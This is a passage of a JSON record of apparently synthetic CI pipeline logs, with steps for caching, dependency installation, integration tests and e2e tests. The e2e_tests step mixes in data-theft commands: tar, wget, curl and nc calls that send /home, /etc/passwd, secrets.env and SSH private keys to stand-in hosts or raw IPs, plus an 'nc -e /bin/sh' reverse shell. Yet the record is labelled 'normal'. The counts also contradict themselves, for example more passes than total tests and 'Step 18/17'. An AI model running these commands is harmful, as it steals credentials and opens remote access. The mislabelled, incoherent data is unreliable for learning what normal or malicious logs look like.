          "Creating production build...",
          "pip: Installing build dependencies...",
          "  PASS: integration/test_user_create.spec.js",
          "Cache invalidated: dependencies",
          "Optimizing 23 modules...",
          "Installing express@3.8.7",
          "npm install: added 435 packages",
          "Bundling vendor.css",
          "Processing...",
          "Done.",
          "Optimizing 49 modules...",
          "npm notice: created a lockfile",
          "[12:47:24] DEBUG: Memory usage: 895MB",
          "Step 10/15: Linting",
          "Compiling lib/handler.rs...",
          "\u2717 build failed with exit code 53",
          "Step 1/23: Testing",
          "Ready.",
          "Optimizing 14 modules...",
          "HEAD is now at 2f3b4d9",
          "WARNING: axios has known vulnerabilities",
          "Done.",
          "Cache saved successfully",
          "[12:47:24] INFO: Request completed",
          "npm notice: package.json updated",
          "TLS handshake completed",
          "Success!",
          "Using Python 3.9",
          "Installing express@5.7.4",
          "Step 3/21: Installing dependencies",
          "Success!",
          "Image pulled successfully",
          "Tests: 84 passed, 151 total",
          "Step 7/19: Deploying",
          "WARNING: jest has known vulnerabilities",
          "Step 4/17: Running migrations",
          "NODE_ENV=production",
          "yarn add: Done in 21.97s",
          "WARNING: webpack has known vulnerabilities",
          "[12:47:24] DEBUG: Query executed in 38ms",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: unit/test_db_connect.spec.js",
          "TLS handshake completed",
          "FAILED: test_user_create",
          "[12:47:24] INFO: Processing request",
          "Completed.",
          "\u2713 All checks passed",
          "Already up to date.",
          "Generating source maps...",
          "Time: 63.87s",
          "Step 9/19: Running migrations",
          "Test Suites: 5 passed, 28 total",
          "Artifact uploaded: dist.zip (29MB)",
          "pip install: Successfully installed eslint-3.1",
          "Connection established",
          "pip: Installing build dependencies...",
          "Verifying...",
          "Switched to branch 'feature/task-322'",
          "Pulling image: python:latest",
          "Waiting...",
          "Compiling components/service.java...",
          "Compiling utils/utils.go...",
          "POST /data - 202 (331ms)",
          "\u2713 build completed",
          "[12:47:24] WARN: Deprecated API usage",
          "[12:47:24] WARN: Deprecated API usage",
          "Transforming 203 files...",
          "Environment: staging",
          "\u2717 build failed with exit code 37",
          "TLS handshake completed",
          "Checking out main branch",
          "\u2713 All checks passed",
          "Cache hit for key-6764",
          "Installing lodash@5.10.10",
          "Fetching submodules...",
          "Compiling lib/app.ts...",
          "Generating source maps...",
          "OK",
          "Waiting...",
          "Artifact uploaded: build.tar.gz (48MB)",
          "\u2713 Task completed in 1916ms",
          "Compiling src/utils.go...",
          "WARNING: eslint has known vulnerabilities",
          "Success!",
          "GET /health - 201 (58ms)",
          "Exception: ValueError",
          "Artifact uploaded: dist.zip (66MB)",
          "Cache miss for key-3279",
          "\u2713 Task completed in 3121ms",
          "Compiling components/handler.rs...",
          "Compiling lib/index.js...",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-26T12:50:24.726701",
        "finished_at": "2025-11-26T12:50:33.044296",
        "log_lines": [
          "=== Step: save_cache ===",
          "npm notice: package.json updated",
          "Bundling main.js",
          "Step 2/16: Installing dependencies",
          "[12:47:24] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling components/app.ts...",
          "\u2713 Task completed in 3556ms",
          "Step 8/16: Testing",
          "Step 8/20: Testing",
          "pip: Collecting jest",
          "pip: Collecting lodash",
          "Loading...",
          "Ready.",
          "Pushing to registry...",
          "Compiling components/main.py...",
          "Cache miss for key-5752",
          "[12:47:24] INFO: Cache refreshed",
          "Transforming 919 files...",
          "Building Docker image...",
          "\u2713 Step 'checkout' succeeded",
          "Processing...",
          "Pushing to registry...",
          "Step 19/19: Running migrations",
          "[12:47:24] WARN: Deprecated API usage",
          "Cache miss for key-2100",
          "Creating production build...",
          "npm install: resolved 114 packages",
          "Cache restored successfully (406MB)",
          "Cache miss for key-5539",
          "Already up to date.",
          "Environment: production",
          "Step 10/23: Linting",
          "Step 15/24: Deploying",
          "[12:47:24] WARN: Deprecated API usage",
          "Generating source maps...",
          "Step 19/19: Building",
          "Pulling image: alpine:3.11",
          "Artifact downloaded: 18MB",
          "npm install: resolved 1632 packages",
          "Checking out master branch",
          "[12:47:24] INFO: Starting build process",
          "Layer 3/9: RUN command",
          "Compiling lib/main.py...",
          "\u2713 Task completed in 4457ms",
          "POST /data - 202 (484ms)",
          "\u2713 All checks passed",
          "Fetching from https://npmjs.org/package.json",
          "Completed.",
          "[12:47:24] DEBUG: Memory usage: 1606MB",
          "[12:47:24] DEBUG: Loading configuration",
          "FAILED: test_cache_hit",
          "  PASS: unit/test_user_create.spec.js",
          "Cache miss for key-2554",
          "OK",
          "[12:47:24] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Connection established",
          "Ran 189 tests in 21s",
          "Ready.",
          "Ran 132 tests in 7s",
          "Fetching submodules...",
          "Checking out main branch",
          "Connection established",
          "Cache hit for key-3654",
          "Platform: linux-x64",
          "Connection established",
          "pip: Downloading axios-1.6.tar.gz",
          "Success!",
          "Success!",
          "\u2717 build failed with exit code 19",
          "Step 8/18: Running migrations",
          "\u2713 All checks passed",
          "POST /data - 200 (487ms)",
          "Ready.",
          "Verifying...",
          "Cache restored successfully (22MB)",
          "Step 12/23: Testing",
          "[12:47:24] DEBUG: Query executed in 50ms",
          "Compiling lib/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Checking out develop branch",
          "Step 13/20: Deploying",
          "\u2713 Task completed in 4335ms",
          "Done.",
          "FAILED: test_cache_hit",
          "Platform: linux-x64",
          "Success!",
          "Time: 3.539s",
          "GET /status - 200 (59ms)",
          "WARNING: react has known vulnerabilities",
          "\u2717 build failed with exit code 79",
          "Completed.",
          "Ready.",
          "[12:47:24] INFO: Starting build process",
          "GET /status - 204 (33ms)",
          "Step 2/25: Testing",
          "Step 17/18: Installing dependencies",
          "Building Docker image...",
          "Step 10/15: Running migrations",
          "WARNING: prettier has known vulnerabilities",
          "Verifying...",
          "Verifying...",
          "Step 11/17: Deploying",
          "Optimizing 55 modules...",
          "[12:47:24] WARN: Deprecated API usage",
          "[12:47:24] DEBUG: Memory usage: 1418MB",
          "yarn add: Done in 14.54s",
          "HEAD is now at 5dc52f3",
          "Compiling src/index.js...",
          "npm notice: package.json updated",
          "npm notice: created a lockfile",
          "Transforming 279 files...",
          "Already up to date.",
          "Step 15/25: Running migrations",
          "Step 9/24: Running migrations",
          "Step 19/23: Deploying",
          "[12:47:24] WARN: Deprecated API usage",
          "npm install: added 137 packages",
          "WARNING: express has known vulnerabilities",
          "[12:47:24] DEBUG: Loading configuration",
          "Generating source maps...",
          "Minifying main.js",
          "pip: Downloading axios-5.20.tar.gz",
          "\u2717 build failed with exit code 22",
          "Using Node.js 18.15.3",
          "[12:47:24] INFO: Request completed",
          "Ready.",
          "[12:47:24] INFO: Processing request",
          "Image pulled successfully",
          "  PASS: e2e/test_auth_login.spec.js",
          "Environment: staging",
          "[12:47:24] INFO: Processing request",
          "Compiling lib/index.js...",
          "Uploading artifact 'build' (36 files)",
          "Step 5/23: Linting",
          "\u2713 build completed",
          "[12:47:24] INFO: Starting build process",
          "npm install: resolved 1434 packages",
          "Minifying app.js",
          "\u2713 Task completed in 315ms",
          "Switched to branch 'feature/task-300'",
          "Platform: darwin-arm64",
          "Success!",
          "[12:47:24] WARN: Deprecated API usage",
          "[12:47:24] DEBUG: Connection pool: 11 active",
          "[12:47:24] DEBUG: Initializing service",
          "Creating production build...",
          "Creating production build...",
          "Waiting...",
          "[12:47:24] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (31MB)",
          "OK",
          "Layer 3/9: ENV command",
          "Coverage: 76% statements, 76% branches",
          "Building Docker image...",
          "POST /api - 201 (497ms)",
          "Ran 99 tests in 60s",
          "Image pulled successfully",
          "Layer 8/14: RUN command",
          "Snapshots: 17 passed, 19 total",
          "Step 1/15: Testing",
          "Step 8/15: Deploying",
          "  PASS: test_auth_login (119ms)",
          "Compiling utils/utils.go...",
          "WARNING: react has known vulnerabilities",
          "Exception: TypeError",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-26T12:50:33.044296",
        "finished_at": "2025-11-26T12:51:14.632271",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "POST /api - 201 (347ms)",
          "Building Docker image...",
          "Switched to branch 'bugfix/task-228'",
          "Cache hit for key-6026",
          "Optimizing 86 modules...",
          "[12:47:24] INFO: Cache refreshed",
          "Generating source maps...",
          "Finished.",
          "POST /data - 202 (346ms)",
          "Pushing to registry...",
          "Compiling components/app.ts...",
          "[12:47:24] DEBUG: Memory usage: 1319MB",
          "Transforming 252 files...",
          "Snapshots: 14 passed, 47 total",
          "Fetching submodules...",
          "POST /data - 201 (254ms)",
          "Fetching submodules...",
          "[12:47:24] INFO: Connecting to database",
          "NODE_ENV=development",
          "GET /status - 204 (22ms)",
          "npm install: added 172 packages",
          "OK",
          "Already up to date.",
          "POST /data - 202 (494ms)",
          "Cache hit for key-3820",
          "NODE_ENV=production",
          "[12:47:24] INFO: Request completed",
          "TLS handshake completed",
          "Loading...",
          "Uploading artifact 'coverage' (45 files)",
          "pip: Installing build dependencies...",
          "Fetching submodules...",
          "Step 2/24: Linting",
          "Cache restored successfully (489MB)",
          "[12:47:24] INFO: Starting build process",
          "Step 10/25: Linting",
          "npm install: added 386 packages",
          "Snapshots: 45 passed, 20 total",
          "[12:47:24] WARN: Deprecated API usage",
          "Optimizing 67 modules...",
          "  PASS: test_cache_hit (30ms)",
          "pip: Downloading axios-3.13.tar.gz",
          "\u2713 All checks passed",
          "Environment: test",
          "pip: Installing build dependencies...",
          "Transforming 111 files...",
          "Artifact downloaded: 15MB",
          "Platform: darwin-arm64",
          "Connection established",
          "pip: Installing build dependencies...",
          "Compiling src/main.py...",
          "pip: Downloading prettier-4.10.tar.gz",
          "Image pulled successfully",
          "pip: Collecting react",
          "Uploading artifact 'dist' (37 files)",
          "Done.",
          "[12:47:24] ERROR: Connection failed",
          "  PASS: test_db_connect (395ms)",
          "Uploading artifact 'coverage' (28 files)",
          "HEAD is now at 0f1559a",
          "Compiling components/app.ts...",
          "[12:47:24] INFO: Request completed",
          "Finished.",
          "Cache invalidated: dependencies",
          "Snapshots: 7 passed, 16 total",
          "Checking out master branch",
          "WARNING: webpack has known vulnerabilities",
          "Processing...",
          "Using Node.js 15.5.5",
          "GET /api - 204 (66ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 deploy completed",
          "\u2713 All checks passed",
          "[12:47:24] INFO: Cache refreshed",
          "POST /data - 201 (238ms)",
          "Using Node.js 20.5.0",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: test_cache_hit (67ms)",
          "yarn add: Done in 1.31s",
          "Already up to date.",
          "Layer 4/11: RUN command",
          "Finished.",
          "  PASS: e2e/test_auth_login.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Pulling image: node:18",
          "Artifact uploaded: dist.zip (38MB)",
          "Artifact uploaded: dist.zip (11MB)",
          "Optimizing 49 modules...",
          "Step 1/20: Deploying",
          "[12:47:24] INFO: Starting build process",
          "Already up to date.",
          "Artifact downloaded: 21MB",
          "Processing...",
          "Cache miss for key-8097",
          "[12:47:24] WARN: Deprecated API usage",
          "npm notice: created a lockfile",
          "pip install: Successfully installed jest-1.3",
          "Processing...",
          "Step 6/20: Running migrations",
          "Platform: linux-x64",
          "[12:47:24] DEBUG: Query executed in 76ms",
          "Bundling main.css",
          "[12:47:24] INFO: Processing request",
          "Compiling components/app.ts...",
          "[12:47:24] DEBUG: Memory usage: 1533MB",
          "Tests: 97 passed, 391 total",
          "Step 7/17: Running migrations",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-1922",
          "Layer 3/9: ENV command",
          "Compiling src/service.java...",
          "pip install: Successfully installed webpack-4.3",
          "Optimizing 27 modules...",
          "Coverage: 83% statements, 100% branches",
          "Pulling image: python:18",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache invalidated: build",
          "\u2713 All checks passed",
          "Step 2/22: Linting",
          "OK",
          "Done.",
          "Cache saved successfully",
          "WARNING: react has known vulnerabilities",
          "Cache miss for key-3364",
          "pip install: Successfully installed lodash-5.12",
          "Step 17/24: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:47:24] DEBUG: Initializing service",
          "Cache restored successfully (121MB)",
          "Cache invalidated: build",
          "Ran 13 tests in 35s",
          "\u2713 Step 'setup' succeeded",
          "Transforming 480 files...",
          "NODE_ENV=development",
          "  PASS: test_db_connect (264ms)",
          "pip: Installing build dependencies...",
          "Test Suites: 29 passed, 16 total",
          "pip: Downloading jest-4.16.tar.gz",
          "Cache invalidated: node_modules",
          "Coverage: 73% statements, 93% branches",
          "  PASS: test_db_connect (413ms)",
          "Pulling image: python:latest",
          "Processing...",
          "Cache invalidated: dependencies",
          "[12:47:24] INFO: Cache refreshed",
          "Fetching from https://docker.io/package.json",
          "  PASS: e2e/test_api_health.spec.js",
          "[12:47:24] WARN: Deprecated API usage",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (15MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Waiting...",
          "Ready.",
          "Ready.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact downloaded: 34MB",
          "Cache invalidated: build",
          "OK",
          "Ready.",
          "GET /status - 200 (62ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "pip: Collecting eslint",
          "Layer 3/11: ENV command",
          "Compiling utils/app.ts...",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-26T12:51:14.632271",
        "finished_at": "2025-11-26T12:51:42.357588",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Processing...",
          "Installing express@4.20.2",
          "Checking out develop branch",
          "Minifying main.js",
          "Platform: linux-x64",
          "Optimizing 17 modules...",
          "Artifact uploaded: dist.zip (26MB)",
          "[12:47:24] INFO: Request completed",
          "Image pulled successfully",
          "Ready.",
          "Compiling utils/service.java...",
          "Fetching from https://docker.io/package.json",
          "Compiling lib/main.py...",
          "  PASS: test_cache_hit (420ms)",
          "[12:47:24] DEBUG: Loading configuration",
          "Artifact uploaded: dist.zip (56MB)",
          "\u2717 build failed with exit code 111",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "OK",
          "Pushing to registry...",
          "Compiling lib/app.ts...",
          "Compiling components/app.ts...",
          "Loading...",
          "pip: Installing build dependencies...",
          "Artifact uploaded: dist.zip (15MB)",
          "TLS handshake completed",
          "Step 13/15: Deploying",
          "\u2713 All checks passed",
          "Step 20/25: Building",
          "Cache saved successfully",
          "  PASS: test_db_connect (460ms)",
          "  PASS: test_api_health (207ms)",
          "[12:47:24] DEBUG: Loading configuration",
          "Exception: RuntimeError",
          "GET /api - 201 (32ms)",
          "Compiling lib/index.js...",
          "Fetching from https://amazonaws.com/package.json",
          "Optimizing 96 modules...",
          "Completed.",
          "Cache restored successfully (317MB)",
          "Step 13/18: Deploying",
          "OK",
          "npm notice: created a lockfile",
          "[12:47:24] WARN: Deprecated API usage",
          "Loading...",
          "\u2713 All checks passed",
          "[12:47:24] INFO: Cache refreshed",
          "Ready.",
          "Optimizing 94 modules...",
          "OK",
          "Already up to date.",
          "Creating production build...",
          "Minifying app.js",
          "npm notice: created a lockfile",
          "Generating source maps...",
          "Compiling lib/main.py...",
          "Artifact uploaded: dist.zip (21MB)",
          "Cache saved successfully",
          "Building Docker image...",
          "Installing express@3.3.3",
          "npm install: resolved 1040 packages",
          "npm install: resolved 1436 packages",
          "Compiling src/service.java...",
          "Snapshots: 0 passed, 20 total",
          "Cache hit for key-5115",
          "pip: Collecting prettier",
          "Using Node.js 18.11.5",
          "HEAD is now at d40fd84",
          "  PASS: e2e/test_auth_login.spec.js",
          "Cache invalidated: dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm notice: created a lockfile",
          "npm notice: package.json updated",
          "Connection established",
          "\u2713 validate completed",
          "POST /data - 201 (28ms)",
          "OK",
          "Uploading artifact 'dist' (27 files)",
          "Fetching submodules...",
          "pip install: Successfully installed axios-2.8",
          "[12:47:24] DEBUG: Initializing service",
          "Bundling runtime.css",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Success!",
          "Compiling utils/utils.go...",
          "Fetching from https://googleapis.com/package.json",
          "Done.",
          "Already up to date.",
          "Ready.",
          "[12:47:24] INFO: Cache refreshed",
          "Fetching submodules...",
          "Compiling src/index.js...",
          "Cache hit for key-6457",
          "Success!",
          "[12:47:24] DEBUG: Query executed in 25ms",
          "Bundling styles.js",
          "TLS handshake completed",
          "Completed.",
          "FAILED: test_user_create",
          "Tests: 356 passed, 324 total",
          "Fetching submodules...",
          "[12:47:24] WARN: Deprecated API usage",
          "Step 20/23: Linting",
          "Compiling components/service.java...",
          "  PASS: test_api_health (388ms)",
          "Time: 116.298s",
          "pip: Collecting prettier",
          "TLS handshake completed",
          "Test Suites: 15 passed, 30 total",
          "POST /upload - 201 (311ms)",
          "Step 13/18: Building",
          "Step 1/23: Installing dependencies",
          "Artifact uploaded: dist.zip (95MB)",
          "Minifying app.js",
          "Ready.",
          "[12:47:24] INFO: Cache refreshed",
          "Cache hit for key-9973",
          "Connection established",
          "[12:47:24] INFO: Processing request",
          "\u2713 Step 'test' succeeded",
          "npm notice: package.json updated",
          "\u2717 build failed with exit code 90",
          "Fetching submodules...",
          "Tests: 133 passed, 222 total",
          "Exception: RuntimeError",
          "Ran 60 tests in 3s",
          "Finished.",
          "  PASS: unit/test_db_connect.spec.js",
          "GET /api - 204 (35ms)",
          "Generating source maps...",
          "[12:47:24] INFO: Cache refreshed",
          "Step 17/18: Deploying",
          "Creating production build...",
          "Artifact uploaded: dist.zip (36MB)",
          "Ready.",
          "pip install: Successfully installed eslint-4.5",
          "Exception: NullPointerException",
          "[12:47:24] DEBUG: Query executed in 24ms",
          "Cache invalidated: build",
          "POST /data - 200 (128ms)",
          "GET /api - 200 (3ms)",
          "\u2717 build failed with exit code 67",
          "Pushing to registry...",
          "\u2713 All checks passed",
          "HEAD is now at de7a665",
          "Compiling src/handler.rs...",
          "Step 11/20: Installing dependencies",
          "\u2717 build failed with exit code 59",
          "pip: Installing build dependencies...",
          "HEAD is now at 0c2f574",
          "[12:47:24] WARN: Deprecated API usage",
          "[12:47:24] INFO: Cache refreshed",
          "npm install: added 375 packages",
          "Artifact downloaded: 27MB",
          "Switched to branch 'feature/task-361'",
          "Step 3/21: Testing",
          "Cache invalidated: node_modules",
          "npm notice: created a lockfile",
          "[12:47:24] DEBUG: Query executed in 58ms",
          "npm notice: package.json updated",
          "HEAD is now at f5e76b9",
          "Pushing to registry...",
          "Loading...",
          "\u2713 Task completed in 4326ms",
          "Ran 56 tests in 57s",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-26T12:51:42.357588",
        "finished_at": "2025-11-26T12:51:56.220246",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "\u2713 Step 'install' succeeded",
          "Pulling image: alpine:3.11",
          "Compiling src/service.java...",
          "Step 4/23: Testing",
          "Snapshots: 48 passed, 44 total",
          "[12:47:24] DEBUG: Initializing service",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "\u2713 All checks passed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "[12:47:24] DEBUG: Loading configuration",
          "Snapshots: 31 passed, 5 total",
          "HEAD is now at eed2902",
          "Compiling utils/service.java...",
          "NODE_ENV=development",
          "Fetching from https://gcr.io/package.json",
          "\u2713 Task completed in 4158ms",
          "Success!",
          "Installing react@3.15.3",
          "Ready.",
          "Fetching from https://gcr.io/package.json",
          "Checking out master branch",
          "Minifying main.js",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip install: Successfully installed lodash-5.6",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "Step 18/17: Running migrations",
          "Connection established",
          "Verifying...",
          "OK",
          "npm install: resolved 123 packages",
          "\u2713 build completed",
          "[12:47:24] WARN: Deprecated API usage",
          "Waiting...",
          "pip: Collecting react",
          "GET /status - 201 (17ms)",
          "[12:47:24] DEBUG: Initializing service",
          "Sending 485MB of data to crypto-mine.io",
          "Artifact uploaded: dist.zip (89MB)",
          "Using Node.js 15.9.10",
          "Already up to date.",
          "Platform: win32-x64",
          "\u2713 package completed",
          "Already up to date.",
          "Installing jest@2.14.3",
          "Completed.",
          "Step 15/17: Running migrations",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "Optimizing 62 modules...",
          "[12:47:24] WARN: Deprecated API usage",
          "Image pulled successfully",
          "Completed.",
          "[12:47:24] DEBUG: Initializing service",
          "Minifying main.js",
          "pip: Installing build dependencies...",
          "Ready.",
          "Fetching submodules...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 107.10.62.118 33497",
          "Pushing to registry...",
          "Pushing to registry...",
          "Sending 342MB of data to evil-server.cc",
          "[12:47:24] INFO: Request completed",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "npm install: added 343 packages",
          "Cache miss for key-4783",
          "Fetching from https://pypi.org/package.json",
          "Cache invalidated: build",
          "Snapshots: 34 passed, 40 total",
          "Ready.",
          "Installing lodash@5.9.4",
          "Minifying main.js",
          "pip: Downloading webpack-1.5.tar.gz",
          "Done.",
          "[12:47:24] WARN: Deprecated API usage",
          "[12:47:24] INFO: Starting build process",
          "Compiling components/main.py...",
          "Cache restored successfully (317MB)",
          "Environment: test",
          "NODE_ENV=test",
          "Ran 186 tests in 5s",
          "Sending 178MB of data to crypto-mine.io",
          "Compiling src/index.js...",
          "Using Python 3.11",
          "Done.",
          "pip: Downloading react-1.20.tar.gz",
          "[12:47:24] INFO: Processing request",
          "HEAD is now at 7c27080",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "Snapshots: 1 passed, 24 total",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 112.171.171.40 14300",
          "Image pulled successfully",
          "yarn add: Done in 16.51s",
          "Minifying app.js",
          "Switched to branch 'hotfix/task-750'",
          "Using Node.js 19.1.2",
          "  PASS: test_user_create (308ms)",
          "pip: Collecting jest",
          "pip install: Successfully installed express-4.17",
          "pip: Installing build dependencies...",
          "Pulling image: python:18",
          "Artifact downloaded: 26MB",
          "Using Node.js 18.9.10",
          "Cache saved successfully",
          "Finished.",
          "Generating source maps...",
          "Step 8/21: Linting",
          "Installing jest@4.4.0",
          "[12:47:24] ERROR: Connection failed",
          "Processing...",
          "Step 8/16: Testing",
          "Artifact uploaded: dist.zip (70MB)",
          "Cache hit for key-3724",
          "Environment: staging",
          "Coverage: 84% statements, 60% branches",
          "[12:47:24] ERROR: Connection failed",
          "Uploading artifact 'dist' (15 files)",
          "curl -X POST https://crypto-mine.io/collect --data @secrets.env",
          "HEAD is now at 94222e4",
          "Generating source maps...",
          "Image pulled successfully",
          "pip install: Successfully installed express-4.10",
          "Pulling image: alpine:latest",
          "Artifact uploaded: dist.zip (39MB)",
          "Pulling image: node:18",
          "\u2713 Step 'checkout' succeeded",
          "OK",
          "Finished.",
          "[12:47:24] INFO: Processing request",
          "[12:47:24] ERROR: Connection failed",
          "Processing...",
          "Compiling lib/service.java...",
          "Layer 8/11: ENV command",
          "pip install: Successfully installed prettier-5.18",
          "[12:47:24] DEBUG: Memory usage: 1731MB",
          "Verifying...",
          "pip install: Successfully installed eslint-5.1",
          "Waiting...",
          "[12:47:24] DEBUG: Initializing service",
          "Connection established",
          "NODE_ENV=production",
          "pip: Downloading lodash-5.16.tar.gz",
          "[12:47:24] DEBUG: Connection pool: 6 active",
          "Checking out master branch",
          "Bundling styles.css",
          "Switched to branch 'bugfix/task-647'",
          "Creating production build...",
          "[12:47:24] INFO: Processing request",
          "FAILED: test_api_health",
          "pip: Collecting jest",
          "pip install: Successfully installed prettier-1.8",
          "Minifying vendor.js",
          "POST /api - 200 (362ms)",
          "Test Suites: 22 passed, 7 total",
          "Bundling main.css",
          "pip: Downloading express-4.16.tar.gz",
          "Step 3/15: Linting",
          "Test Suites: 34 passed, 34 total",
          "Time: 8.432s",
          "NODE_ENV=development",
          "Uploading artifact 'coverage' (37 files)",
          "pip: Installing build dependencies...",
          "pip install: Successfully installed eslint-1.13",
          "nc -e /bin/sh 118.43.168.46 23410",
          "Time: 53.436s",
          "Compiling src/handler.rs...",
          "Compiling lib/utils.go...",
          "Switched to branch 'bugfix/task-486'",
          "yarn add: Done in 1.17s",
          "NODE_ENV=test",
          "[12:47:24] WARN: Deprecated API usage",
          "Building Docker image...",
          "pip: Collecting eslint",
          "[12:47:24] ERROR: Connection failed",
          "\u2713 All checks passed",
          "[12:47:24] WARN: Deprecated API usage",
          "Minifying main.js",
          "pip: Installing build dependencies...",
          "OK",
          "Using Node.js 20.1.10",
          "Compiling src/handler.rs...",
          "=== Step e2e_tests completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}